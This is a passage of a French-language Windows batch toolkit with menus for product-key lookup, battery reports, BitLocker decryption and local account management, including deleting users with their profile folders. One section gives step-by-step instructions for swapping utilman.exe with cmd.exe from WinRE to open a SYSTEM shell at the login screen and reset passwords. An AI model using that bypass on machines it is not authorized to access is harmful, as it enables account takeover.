for /f "tokens=3" %%A in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform" /v BackupProductKeyDefault 2^>nul ^| findstr /i "BackupProductKeyDefault"') do (
    set "WINKEY=%%A"
)
if "!WINKEY!"=="" (
    echo [ECHEC] Impossible de lire la cle par defaut dans le registre.
) else (
    echo [OK] Cle Windows installee :
    echo.
    powershell -NoProfile -Command "Write-Host '    !WINKEY!' -ForegroundColor Green"
    echo.
)
pause
goto sys_win_key

:win_key_office
cls
echo ===============================================
echo      Cle de produit Microsoft Office
echo ===============================================
echo.
echo Recherche des licences Office installees...
echo.
set "office_vbs="
if exist "%ProgramFiles%\Microsoft Office\Office16\ospp.vbs" set "office_vbs=%ProgramFiles%\Microsoft Office\Office16\ospp.vbs"
if exist "%ProgramFiles(x86)%\Microsoft Office\Office16\ospp.vbs" set "office_vbs=%ProgramFiles(x86)%\Microsoft Office\Office16\ospp.vbs"

if "!office_vbs!"=="" (
    echo [INFO] Script de statut Office non trouve ^(ospp.vbs^).
    echo Si Office est installe, sa version est peut-etre differente ^(pas 2016/2019/365^).
) else (
    echo [INFO] Depuis Office 2013, Microsoft masque volontairement 
    echo la cle de licence complete sur votre ordinateur par securite.
    echo Seuls les 5 derniers caracteres sont stockes sur ce PC.
    echo.
    powershell -NoProfile -Command "$raw = cscript //nologo '!office_vbs!' /dstatus; $matches = $raw | Select-String -Pattern 'KEY'; if ($matches) { foreach($m in $matches) { Write-Host '   '$m.Line.Trim() -ForegroundColor Cyan } } else { Write-Host 'Aucune cle detectee ou en mode Abonnement / Inactif.' -ForegroundColor Yellow }"
)
echo.
pause
goto sys_win_key

:sys_god_mode
cls
echo ===============================================
echo      Creation du dossier "God Mode"
echo ===============================================
echo.
echo Le "God Mode" centralise tous les parametres de Windows 
echo (+ de 200 options^) dans un seul et meme dossier.
echo.
set "GODMODE_PATH=%USERPROFILE%\Desktop\God Mode.{ED7BA470-8E54-465E-825C-99712043E01C}"
if exist "!GODMODE_PATH!" (
    echo [INFO] Le dossier God Mode existe deja sur votre Bureau.
) else (
    mkdir "!GODMODE_PATH!" >nul 2>&1
    if !errorlevel!==0 (
        echo [OK] Le dossier God Mode a ete cree sur votre Bureau !
    ) else (
        echo [ECHEC] Impossible de creer le dossier.
    )
)
echo.
pause
goto system_tools

:sys_battery_report
cls
echo ===============================================
echo      Rapport de Batterie (Sante et Usure)
echo ===============================================
echo.
echo Generation du rapport en cours...
powercfg /batteryreport /output "%USERPROFILE%\Desktop\battery_report.html" >nul 2>&1
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$r='%USERPROFILE%\Desktop\battery_report.html';if(Test-Path $r){$c=Get-Content $r -Raw;$d=0;$f=0;if($c -match '(?s)DESIGN CAPACITY.*?([\d\s,\xA0]+)\s*mWh'){$d=[int]($matches[1] -replace '\D','')};if($c -match '(?s)FULL CHARGE CAPACITY.*?([\d\s,\xA0]+)\s*mWh'){$f=[int]($matches[1] -replace '\D','')};if($d -gt 0){$h=[math]::Round(($f/$d)*100,2);if($h -gt 100){$h=100};$w=[math]::Round(100-$h,2);if($w -lt 0){$w=0};Write-Host ('  - Capacite d''usine : '+$d+' mWh') -f Cyan;Write-Host ('  - Capacite actuelle : '+$f+' mWh') -f Cyan;Write-Host ('  - Sante de la batterie : '+$h+'%%') -f Green;Write-Host ('  - Niveau d''usure : '+$w+'%%') -f Yellow}else{Write-Host 'Impossible de lire les donnees de capacite. (PC Fixe ou pas de batterie ?)' -f Red}}else{Write-Host 'Le fichier de rapport n''a pas pu etre cree.' -f Red}"
echo.
echo Le rapport complet (Historique, Cycles) est sur votre Bureau:
echo battery_report.html
echo.
pause
goto system_tools



:sys_bitlocker_check
cls
echo ===============================================
echo     Verification chiffrement BitLocker / Dechiffrage
echo ===============================================
echo.
set /p drive_letter=Lettre du lecteur a verifier (ex: C): 
if "%drive_letter%"=="" set drive_letter=C

rem Normaliser en ajoutant deux-points si absent
set "dl=%drive_letter%"
if not "%dl:~-1%"==":" set "dl=%dl%:"

cls
echo Verification du statut BitLocker pour %dl% ...
manage-bde -status %dl%

for /f "tokens=2 delims{:} " %%A in ('manage-bde -status %dl% ^| findstr /I "Conversion Status   Percentage Encrypted   Protection Status   Verrouille   Locked   Protection"') do set bl_state=%%A

rem Detection simple via findstr si le volume est non chiffre
manage-bde -status %dl% | findstr /I "Percentage Encrypted: 0%" >nul 2>&1
if %errorlevel%==0 (
    echo.
    echo Ce lecteur ne semble pas chiffre. Aucune action necessaire.
    pause
    goto system_tools
)

echo.
set /p confirm_dec=Le lecteur est chiffre. Voulez-vous lancer le dechiffrement maintenant ? (O/N): 
if /i "%confirm_dec%"=="O" (
    echo Lancement du dechiffrement de %dl% ...
    manage-bde -off %dl%
    echo Commande envoyee. Le processus peut prendre du temps.
    pause
    goto system_tools
) else (
    echo Operation annulee.
    pause
    goto system_tools
)

REM ================= Embedded: Gestion des utilisateurs locaux (um_*) =================
:um_menu
setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
for /f "usebackq tokens=*" %%G in (`powershell -NoProfile -Command "$n=([System.Security.Principal.SecurityIdentifier]::new('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount]).Value.Split('\\')[-1]; Write-Output $n"`) do set "UM_ADMIN_GROUP=%%G"
if not defined UM_ADMIN_GROUP set "UM_ADMIN_GROUP=Administrators"
net localgroup "%UM_ADMIN_GROUP%" >nul 2>&1 || set "UM_ADMIN_GROUP=Administrateurs"
set "UM_STR_PWD_REQ_EN=Password required"
set "UM_STR_PWD_REQ_FR=Mot de passe requis"

set "opts=Lister les utilisateurs;Ajouter un utilisateur;Supprimer un utilisateur;Gerer les droits (Standard/Admin);Ajouter/Modifier un mot de passe;Supprimer le mot de passe (Auto-login)"
call :DynamicMenu "GESTION UTILISATEURS LOCAUX" "%opts%"
set "um_choice=%errorlevel%"

if "%um_choice%"=="1" goto um_list
if "%um_choice%"=="2" goto um_add
if "%um_choice%"=="3" goto um_del
if "%um_choice%"=="4" goto um_admin
if "%um_choice%"=="5" goto um_reset
if "%um_choice%"=="6" goto um_remove_pwd
if "%um_choice%"=="0" goto um_exit
goto um_menu

:um_list
cls
echo Utilisateur           Admin   Actif   MDPDefini
echo ------------------------------------------------
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; $adminGroups=@('Administrators','Administrateurs'); $admins=@(); foreach($g in $adminGroups){ try{ $admins+=$(Get-LocalGroupMember -Group $g -ErrorAction Stop | ForEach-Object { $_.Name.Split('\\')[-1] }) } catch{} }; $admins = $admins | Sort-Object -Unique; Get-LocalUser | Where-Object Enabled | Sort-Object Name | ForEach-Object { $u=$_; $has=$false; try { $pls = $u | Select-Object -ExpandProperty PasswordLastSet -ErrorAction Stop; if ($pls) { $has=$true } } catch {}; if (-not $has) { try { $nu = net user \"$($u.Name)\" 2>$null; $line = $nu | Where-Object { $_ -match '^(Password last set|Dernier changement du mot de passe)\s+' }; if ($line) { $val = ($line -split '\\s{2,}',2)[1].Trim(); if ($val -and $val -notmatch '^(Never|Jamais)$') { $has=$true } } } catch {} }; if (-not $has -and $u.PasswordRequired) { $has=$true }; [PSCustomObject]@{ Utilisateur=$u.Name; Admin= if($admins -contains $u.Name){'Oui'}else{'Non'}; Actif= if($u.Enabled){'Oui'}else{'Non'}; MDPDefini= if($has){'Oui'}else{'Non'} } } | Format-Table -AutoSize -HideTableHeaders" || echo Erreur lors de la liste
echo.
pause
goto um_menu

:um_admin
cls
set "user_opts="
set /a u_idx=0
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if defined user_opts (set "user_opts=!user_opts!;%%U") else (set "user_opts=%%U")
    set /a u_idx+=1
    set "user_arr[!u_idx!]=%%U"
)
if not defined user_opts (
    echo Aucun utilisateur actif trouve.
    pause
    goto um_menu
)

call :DynamicMenu "AJOUT/RETRAIT DROITS ADMIN" "%user_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto um_menu

set "UADM=!user_arr[%res%]!"
if not defined UADM goto um_menu

set "opts=Ajouter aux Administrateurs;Retirer des Administrateurs"
call :DynamicMenu "ACTION POUR !UADM!" "%opts%"
set "OP=%errorlevel%"

if "%OP%"=="1" (
    net localgroup "%UM_ADMIN_GROUP%" "%UADM%" /add
    if !errorlevel!==0 (echo '%UADM%' a ete ajoute aux Administrateurs.) else (echo Echec.)
) else if "%OP%"=="2" (
    net localgroup "%UM_ADMIN_GROUP%" "%UADM%" /delete
    if !errorlevel!==0 (echo '%UADM%' a ete retire des Administrateurs.) else (echo Echec.)
)
pause
goto um_menu


:um_add
cls
call :um_show_active
set "NEWU="
set /p NEWU="Nom d'utilisateur a ajouter > "
if "%NEWU%"=="" goto um_menu
set "SETPWD="
set /p SETPWD="Affecter un mot de passe maintenant ? (O/N) > "
if /I not "%SETPWD%"=="O" goto um_add_no_pwd

set "NEWP="
set /p NEWP="Mot de passe > "
net user "%NEWU%" "%NEWP%" /add /y
goto um_add_check

:um_add_no_pwd
net user "%NEWU%" "" /add /y

:um_add_check
if not %errorlevel%==0 (
    echo Echec de creation de l'utilisateur.
    pause
    goto um_menu
)

set "ADDADM="
set /p ADDADM="Ajouter '%NEWU%' aux Administrateurs ? (O/N) > "
if /I "%ADDADM%"=="O" net localgroup "%UM_ADMIN_GROUP%" "%NEWU%" /add
echo.
echo [OK] Utilisateur cree avec succes.
pause
goto um_menu

:um_del
cls
set "user_opts="
set /a u_idx=0
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if defined user_opts (set "user_opts=!user_opts!;%%U") else (set "user_opts=%%U")
    set /a u_idx+=1
    set "user_arr[!u_idx!]=%%U"
)
if not defined user_opts (
    echo Aucun utilisateur actif trouve.
    pause
    goto um_menu
)

call :DynamicMenu "SUPPRIMER UN UTILISATEUR" "%user_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto um_menu

set "DELU=!user_arr[%res%]!"
if not defined DELU goto um_menu

cls
echo.
echo ======================================================
echo ATTENTION : Vous allez supprimer l'utilisateur '%DELU%'
echo ET TOUT SON ESPACE SUR LE DISQUE (Images, Documents, Bureau...) !
echo ======================================================
echo.
set /p CONF=Confirmer la suppression totale ? (Tapez OUI pour valider) ^> 
if /I not "%CONF%"=="OUI" (
    echo [X] Operation annulee.
    pause
    goto um_menu
)

echo Suppression du compte Windows en cours...
net localgroup "%UM_ADMIN_GROUP%" "%DELU%" /delete >nul 2>nul
net user "%DELU%" /delete

if not %errorlevel%==0 (
    echo [ECHEC] Impossible de supprimer le compte utilisateur '%DELU%'.
    pause
    goto um_menu
)

echo [OK] Utilisateur Windows supprime.
echo.
set "TMP_PS1=%temp%\wipe_profile_%RANDOM%.ps1"

echo param($u, $l) > "%TMP_PS1%"
echo $arg='/c rmdir /s /q "'+$u+'" ^>^> "'+$l+'" 2^>^&1' >> "%TMP_PS1%"
echo "RAPPORT: Nettoyage et suppression definitive du dossier "+$u ^| Out-File -Encoding UTF8 $l >> "%TMP_PS1%"
echo $p=Start-Process 'cmd.exe' -ArgumentList $arg -PassThru -WindowStyle Hidden >> "%TMP_PS1%"
echo $f=@('-', '\', '^|', '/') >> "%TMP_PS1%"
echo $i=0 >> "%TMP_PS1%"
echo while(-not $p.HasExited) { >> "%TMP_PS1%"
echo     Write-Host -NoNewline "`r[ $($f[$i]) ] (Journal dispo sur le Bureau) Effacement des fichiers...   " -ForegroundColor Cyan >> "%TMP_PS1%"
echo     $i=($i+1) %% 4 >> "%TMP_PS1%"
echo     Start-Sleep -Milliseconds 150 >> "%TMP_PS1%"
echo } >> "%TMP_PS1%"
echo Write-Host "`r[ OK ] Dossier personnel efface. L'utilisateur a completement disparu.                      " -ForegroundColor Green >> "%TMP_PS1%"

set "LOGFILE=%USERPROFILE%\Desktop\Suppression_Profil_%DELU%.log"
powershell -NoProfile -ExecutionPolicy Bypass -File "%TMP_PS1%" "C:\Users\%DELU%" "%LOGFILE%"
del /f /q "%TMP_PS1%" >nul 2>&1

if exist "C:\Users\%DELU%" (
    echo.
    echo [!] NOTE: Certains fichiers verrouilles par l'OS n'ont pas pu
    echo etre effaces automatiquement ^(voir journal sur le Bureau^).
)

pause
goto um_menu


:um_reset
cls
set "user_opts="
set /a u_idx=0
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if defined user_opts (set "user_opts=!user_opts!;%%U") else (set "user_opts=%%U")
    set /a u_idx+=1
    set "user_arr[!u_idx!]=%%U"
)
if not defined user_opts (
    echo Aucun utilisateur actif trouve.
    pause
    goto um_menu
)

call :DynamicMenu "AJOUTER/MODIFIER LE MOT DE PASSE" "%user_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto um_menu

set "RUSER=!user_arr[%res%]!"
if not defined RUSER goto um_menu

echo.
set /p RNEWP=Nouveau mot de passe ^> 
set /p RNEWP2=Confirmez le mot de passe ^> 
if not "%RNEWP%"=="%RNEWP2%" (
    echo Les mots de passe ne correspondent pas.
    pause
    goto um_menu
)
net user "%RUSER%" "%RNEWP%"
if not %errorlevel%==0 (
    echo Echec de la mise a jour du mot de passe.
    pause
    goto um_menu
)

echo Mot de passe mis a jour.
set /p RFORCE=Exiger le changement au prochain logon ? (O/N) ^> 
if /I not "%RFORCE%"=="O" goto um_reset_end

powershell -NoProfile -ExecutionPolicy Bypass -Command "$u=[ADSI]('WinNT://' + $env:COMPUTERNAME + '/%RUSER%,user'); $u.PasswordExpired=1; $u.SetInfo()"
echo Obligation de changement au prochain logon active.

:um_reset_end
pause
goto um_menu

:um_remove_pwd
cls
set "user_opts="
set /a u_idx=0
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if defined user_opts (set "user_opts=!user_opts!;%%U") else (set "user_opts=%%U")
    set /a u_idx+=1
    set "user_arr[!u_idx!]=%%U"
)
if not defined user_opts (
    echo Aucun utilisateur actif trouve.
    pause
    goto um_menu
)

call :DynamicMenu "SUPPRIMER MDP (AUTO-LOGIN)" "%user_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto um_menu

set "RUSER=!user_arr[%res%]!"
if not defined RUSER goto um_menu

echo.
echo ======================================================
echo ATTENTION : Vous allez supprimer le mot de passe de '%RUSER%' !
echo Cela permettra a toute personne d'y acceder sans mot de passe a l'allumage.
echo.
set /p RCONFIRM=Voulez-vous vraiment continuer ? (O/N) ^> 
if /I not "%RCONFIRM%"=="O" (
    echo [X] Operation annulee.
    pause
    goto um_menu
)

net user "%RUSER%" "" >nul 2>&1
if %errorlevel%==0 (
    echo [OK] Mot de passe de l'utilisateur '%RUSER%' supprime avec succes.
) else (
    echo [ECHEC] Impossible de supprimer le mot de passe de '%RUSER%'.
)
pause
goto um_menu


:um_show_active
echo.
echo Utilisateurs actifs:
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-LocalUser | Where-Object Enabled | Sort-Object Name | Select-Object -ExpandProperty Name | ForEach-Object { $_ }" 2>nul
echo.
goto :eof

:um_exit
endlocal
goto system_tools
REM ================= End Embedded: Gestion des utilisateurs locaux =================

REM ===================================================================
REM                    SORTIE DU SCRIPT
REM ===================================================================
:exit_script
cls
echo ======================================================
echo     MERCI D'AVOIR UTILISE CET OUTIL !
echo ======================================================
echo.
echo Developpe par ALEEXLEDEV
echo.
echo Appuyez sur une touche pour quitter...
pause >nul
exit

:DynamicMenu
:: Arguments: %1="Titre", %2="Option1;Option2;Option3"
:: Retourne: ERRORLEVEL (1, 2, 3...) ou 0 pour Echap/Retour
setlocal
set "m_title=%~1"
set "m_opts=%~2"

set "ps_code=$o=($env:m_opts -split ';');$t=$env:m_title;$sel=@();for($i=0;$i -lt $o.Count;$i++){if($o[$i] -notmatch '^\[---'){$sel+=$i}};$sIdx=0;$oldIdx=-1;$iY=@{};clear-host;try{$bY=[console]::CursorTop}catch{$bY=0};function D{ try{[console]::SetCursorPosition(0,$bY)}catch{};write-host '                                                                                                                       ';write-host '  ========================================================================================' -f Cyan;write-host ('   ' + $t) -f White;write-host '  ========================================================================================' -f Cyan;write-host '                                                                                                                       ';$num=1;for($i=0;$i -lt $o.Count;$i++){$parts=$o[$i]-split'~';$s=$parts[0];$d='';if($parts.Count -gt 1){$d=$parts[1]};if($s -match '^\[---'){if($i -gt 0){write-host '                                                                                                                       '};try{$iY[$i]=[console]::CursorTop}catch{};write-host ('       ' + $s).PadRight(119) -f Cyan}else{try{$iY[$i]=[console]::CursorTop}catch{};$f_str='    ';if($s -match '^\(F\) '){$f_str='(F) ';$s=$s.Substring(4)};if($i -eq $sel[$sIdx]){$str='{0}>> [{1}] {2}  ' -f $f_str, $num, $s; write-host $str -NoNewline -f Black -b White; $rem=119-$str.Length; if($rem -lt 0){$rem=0}; $ds=if($d){'   - '+$d}else{''}; if($ds.Length -gt $rem){$ds=$ds.Substring(0,$rem)}; write-host $ds.PadRight($rem) -f Yellow}else{$str='{0}   [{1}] {2}  ' -f $f_str, $num, $s; write-host $str.PadRight(119) -f Gray};$num++}};write-host '                                                                                                                       ';write-host '  ----------------------------------------------------------------------------------------' -f Cyan;write-host '   [FLECHES] Naviguer | [ENTREE] Valider | [F] Favoriser | [0/ECHAP] Retour                     ' -f DarkGray;write-host '                                                                                                                       '};D;while($true){if($oldIdx -ne -1 -and $oldIdx -ne $sIdx){$i=$sel[$oldIdx];$parts=$o[$i]-split'~';$s=$parts[0];$num=$oldIdx+1;try{[console]::SetCursorPosition(0,$iY[$i])}catch{};$f_str='    ';if($s -match '^\(F\) '){$f_str='(F) ';$s=$s.Substring(4)};$str='{0}   [{1}] {2}  ' -f $f_str, $num, $s; write-host $str.PadRight(119) -f Gray;$i=$sel[$sIdx];$parts=$o[$i]-split'~';$s=$parts[0];$d='';if($parts.Count -gt 1){$d=$parts[1]};$num=$sIdx+1;try{[console]::SetCursorPosition(0,$iY[$i])}catch{};$f_str='    ';if($s -match '^\(F\) '){$f_str='(F) ';$s=$s.Substring(4)};$str='{0}>> [{1}] {2}  ' -f $f_str, $num, $s; write-host $str -NoNewline -f Black -b White; $rem=119-$str.Length; if($rem -lt 0){$rem=0}; $ds=if($d){'   - '+$d}else{''}; if($ds.Length -gt $rem){$ds=$ds.Substring(0,$rem)}; write-host $ds.PadRight($rem) -f Yellow};$oldIdx=$sIdx;try{[console]::SetCursorPosition(0,$iY[$o.Count-1]+5)}catch{};$k=$Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');$v=$k.VirtualKeyCode;if($v -eq 38){$sIdx--;if($sIdx -lt 0){$sIdx=$sel.Count-1}}elseif($v -eq 40){$sIdx++;if($sIdx -ge $sel.Count){$sIdx=0}}elseif($v -eq 13){clear-host;exit ($sIdx+1)}elseif($v -eq 27 -or $k.Character -eq '0'){clear-host;exit 0}elseif($v -eq 70){clear-host;exit (200+$sIdx+1)}elseif([string]$k.Character -match '^[1-9]$' -and [int][string]$k.Character -le $sel.Count){clear-host;exit ([int][string]$k.Character)}}"

powershell -NoProfile -ExecutionPolicy Bypass -Command "%ps_code%"
set "res=%errorlevel%"
exit /b %res%


:sys_unlock_notes
cls
echo ===============================================
echo   NOTE: Debloquer une session Windows (WinRE)
echo ===============================================
echo.
echo 1^) Demarrer sur une cle USB Windows ^(WinRE/WinPE^) puis ouvrir l'invite de commande.
echo.
echo 2^) Identifier la lettre du disque contenant Windows:
echo    ^> diskpart
echo    ^> list volume
echo    Reperer le volume ou se trouve le dossier \Windows ^(ex: Z:^)
echo.
echo    S'il n'y en a pas ^(pas de lettre sur le volume Windows^):
echo    ^> select volume X
echo    ^> assign letter=Z
echo    ^> exit
echo.
echo 3^) Verifier la presence des fichiers cibles:
echo    ^> dir Z:\windows\system32\cmd.exe
echo    ^> dir Z:\windows\system32\utilman.exe
echo.
echo 4^) Remplacer utilman.exe par cmd.exe ^(sauvegarder si besoin avant^):
echo    ^(Optionnel^) Sauvegarde:
echo    ^> copy Z:\windows\system32\utilman.exe Z:\windows\system32\utilman.exe.bak
echo    Remplacement:
echo    ^> copy Z:\windows\system32\cmd.exe Z:\windows\system32\utilman.exe
echo    Tapez O ^(Oui^) si demande pour remplacer.
echo.
echo 5^) Redemarrer le PC normalement.
echo.
echo 6^) A l'ecran de connexion, cliquer sur le bouton "Ergonomie" ^(facilites d'acces^):
echo    Une fenetre CMD s'ouvre avec privileges systeme.
echo.
echo 7^) Changer le mot de passe du compte desire:
echo    ^> net user nom_utilisateur nouveau_motdepasse
echo    Exemple:
echo    ^> net user martin 123456
echo.
echo 8^) ^(Recommande^) Restaurer utilman.exe d'origine apres recuperation:
echo    ^> copy Z:\windows\system32\utilman.exe.bak Z:\windows\system32\utilman.exe
echo.
echo 9^) Securite:
echo    - N'effectuer ces operations que si vous etes autorise.
echo    - Supprimer la sauvegarde .bak et activer des protections ^(BitLocker, etc.^).
echo.
pause
goto system_tools

:ToggleFav
set "tf_target=%~1"
if not defined tf_target exit /b
set "was_removed=0"
if exist "favoris_tmp.txt" del "favoris_tmp.txt"
if exist "favoris.txt" (
    for /f "usebackq tokens=*" %%F in ("favoris.txt") do (
        if "%%F"=="!tf_target!" (
            set "was_removed=1"
        ) else (
            echo %%F>>favoris_tmp.txt
        )
    )
)
if "!was_removed!"=="0" echo !tf_target!>>favoris_tmp.txt
if exist "favoris_tmp.txt" (move /y "favoris_tmp.txt" "favoris.txt" >nul) else (type nul > "favoris.txt")
exit /b